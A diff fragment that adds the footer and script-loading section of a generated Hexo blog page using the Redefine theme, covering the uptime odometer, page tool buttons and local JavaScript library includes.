+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
